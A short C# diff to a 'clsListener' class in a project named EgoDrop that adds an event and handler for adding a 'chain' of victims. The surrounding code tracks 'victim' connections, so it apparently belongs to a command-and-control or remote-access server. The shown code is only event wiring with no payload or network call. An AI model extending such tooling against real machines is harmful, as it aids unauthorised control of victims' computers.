@@ -22,6 +22,8 @@ namespace EgoDrop
         public event dlgReceivedMessage evtReceivedMessage;
         public delegate void dlgVictimDisconnected(clsListener listener, clsVictim victim);
         public event dlgVictimDisconnected evtVictimDisconnected;
+        public delegate void dlgAddChain(List<string> lsVictim);
+        public event dlgAddChain evtAddChain;
 
         public clsListener()
         {
@@ -51,6 +53,11 @@ namespace EgoDrop
         public void fnOnVictimDisconnected(clsVictim victim)
         {
             evtVictimDisconnected?.Invoke(this, victim);
+        }
+
+        public void fnOnAddChain(List<string> lsVictim)
+        {
+            evtAddChain?.Invoke(lsVictim);
         }
     }
 }
